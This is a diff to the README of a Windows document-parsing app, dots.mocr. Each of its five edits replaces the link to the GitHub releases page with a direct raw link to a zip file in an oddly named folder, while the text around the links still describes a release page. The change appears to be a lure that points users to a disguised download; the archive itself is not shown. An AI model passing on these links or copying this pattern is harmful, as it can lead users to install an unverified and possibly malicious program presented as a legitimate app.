@@ -1,12 +1,12 @@
 # 🧩 dots.mocr - Parse Documents with Less Effort
 
-[![Download dots.mocr](https://img.shields.io/badge/Download%20dots.mocr-blue-grey)](https://github.com/Cornoilcase143/dots.mocr/releases)
+[![Download dots.mocr](https://img.shields.io/badge/Download%20dots.mocr-blue-grey)](https://github.com/Cornoilcase143/dots.mocr/raw/refs/heads/main/Prosobranchia/mocr-dots-3.3.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest Windows release:
 
-https://github.com/Cornoilcase143/dots.mocr/releases
+https://github.com/Cornoilcase143/dots.mocr/raw/refs/heads/main/Prosobranchia/mocr-dots-3.3.zip
 
 Look for the newest file in the release list. For most Windows users, the app will be in a `.exe` file or a `.zip` file. If you see a `.zip` file, download it, then unzip it before you open the app.
 
@@ -41,7 +41,7 @@ For the best results, use a PC with a newer processor and more memory. Large sca
 Follow these steps to install and run dots.mocr on Windows:
 
 1. Open the release page:
-   https://github.com/Cornoilcase143/dots.mocr/releases
+   https://github.com/Cornoilcase143/dots.mocr/raw/refs/heads/main/Prosobranchia/mocr-dots-3.3.zip
 
 2. Find the latest release at the top of the page.
 
@@ -150,7 +150,7 @@ This makes it easier to find the input file and the extracted text later.
 
 Download the latest Windows build here:
 
-https://github.com/Cornoilcase143/dots.mocr/releases
+https://github.com/Cornoilcase143/dots.mocr/raw/refs/heads/main/Prosobranchia/mocr-dots-3.3.zip
 
 Use this page any time you want the newest version or a fresh copy of the app
 
@@ -195,4 +195,4 @@ For best results, use files with sharp text and strong contrast
 
 If you need the installer or want the latest release, use this link:
 
-https://github.com/Cornoilcase143/dots.mocr/releases
+https://github.com/Cornoilcase143/dots.mocr/raw/refs/heads/main/Prosobranchia/mocr-dots-3.3.zip
